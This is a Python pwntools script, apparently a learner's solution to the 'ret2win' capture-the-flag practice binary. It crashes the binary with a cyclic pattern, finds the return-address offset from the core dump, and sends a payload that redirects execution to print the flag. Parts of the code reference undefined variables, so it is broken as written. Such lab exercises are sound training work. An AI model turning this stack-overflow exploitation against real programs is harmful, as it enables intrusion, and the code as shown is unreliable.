from pwn import *

'''

here is an algorithm to find these gadgets; 

1- We search the binary for all “ret” (c3) byte. 

2- We go backwards to see if the previous byte contains a valid 
    instruction. We reverse to the maximum number of bytes that
    can make a valid instruction (20 bytes).

3- We then record all valid instruction sequences found in the 
    binary or linked libraries. 
'''

class Scanner(object):
    def __init__(self, loglevel = 'debug'):
        # Set up pwntools to work with this binary
        self.loglevel = loglevel

    def setcontext(self, elfobject:ELF = 'ret2win'):
        self.elf = context.binary = elfobject #ELF('ret2win')
        # Enable verbose logging so we can see exactly what is being sent.
        context.log_level = self.loglevel

    def showinfo(self):
        # Print out the target address
        info("%#x target", elf.symbols.ret2win)

    #crashput = cyclic(128)
    def shitslapper(self,crashput = cyclic(128)):
        
        # Figure out how big of an overflow we need by crashing the
        # process once.
        io = process(elf.path)
        # We will send a 'cyclic' pattern which overwrites the return
        # address on the stack.  The value 128 is longer than the buffer.
        io.sendline(crashput)
        # Wait for the process to crash
        io.wait()

    def showaftercrash(self):
        # Open up the corefile
        core = io.corefile
        # Print out the address of RSP at the time of crashing
        stack = core.rsp
        info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Craft a new payload which puts the "target" address at the correct offset
payload = fit({
    pattern: elf.symbols.ret2win
})

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.recvuntil("Here's your flag:")

# Get our flag!
flag = io.recvline()
success(flag)